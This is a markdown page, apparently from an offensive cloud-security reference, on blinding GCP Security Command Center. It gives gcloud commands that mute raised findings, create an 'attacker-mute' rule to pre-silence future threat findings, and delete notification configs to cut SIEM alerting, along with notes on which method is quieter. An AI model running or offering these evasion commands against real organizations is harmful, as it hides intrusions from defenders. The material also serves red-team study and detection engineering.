---
title: "Security Command Center: muting and disabling findings"
order: 3
description: "Muting or disabling Security Command Center findings and sources to suppress alerting."
keywords:
  - Security Command Center
  - SCC
  - findings
  - mute
  - detection evasion
  - alerting
---

# Security Command Center

Security Command Center (SCC) is GCP's finding aggregator: it raises alerts from Event Threat Detection, Security Health Analytics, and connected sources, and routes them onward through notification configs. Muting findings, writing a mute rule that pre-silences your activity, or tearing down the notification config stops the alert from reaching defenders. SCC permissions sit under `securitycenter.*` at the organization or project scope.

## Mute what is already raised

```bash
gcloud scc findings list <org-or-project> --filter="category=\"...\""
gcloud scc findings set-mute <finding> --organization=<org> --mute=MUTED
```

## Pre-silence with a mute rule

```bash
# a mute config auto-mutes matching future findings (e.g. your IPs or SA)
gcloud scc muteconfigs create attacker-mute \
  --organization=<org> \
  --filter='resource.project_display_name="prod" AND finding_class="THREAT"'
```

## Cut the notification path

```bash
gcloud scc notifications list --organization=<org>
gcloud scc notifications delete <config> --organization=<org>   # stop Pub/Sub alerting
```

## Exploitation notes

- SCC is primarily an **organization-scoped** service; a project-only principal often cannot mute org-level findings, so confirm the scope your token reaches.
- Muting does not delete a finding, it hides it from the default view; a defender filtering on muted findings still sees it, so a mute rule is suppression, not erasure.
- Deleting the notification config stops the push to Pub/Sub and downstream SIEM while leaving findings in the console, which is quieter than disabling detectors wholesale.

## Tools

- **gcloud** (`scc findings`, `scc muteconfigs`, `scc notifications`): all of the above.
- **ScoutSuite** / **Prowler**: enumerate SCC sources and notification configs.

## References

- [HackTricks Cloud: GCP](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/index.html)
- [Stratus Red Team: GCP techniques](https://stratus-red-team.cloud/attack-techniques/GCP/)
- [Google: mute Security Command Center findings](https://cloud.google.com/security-command-center/docs/how-to-mute-findings)
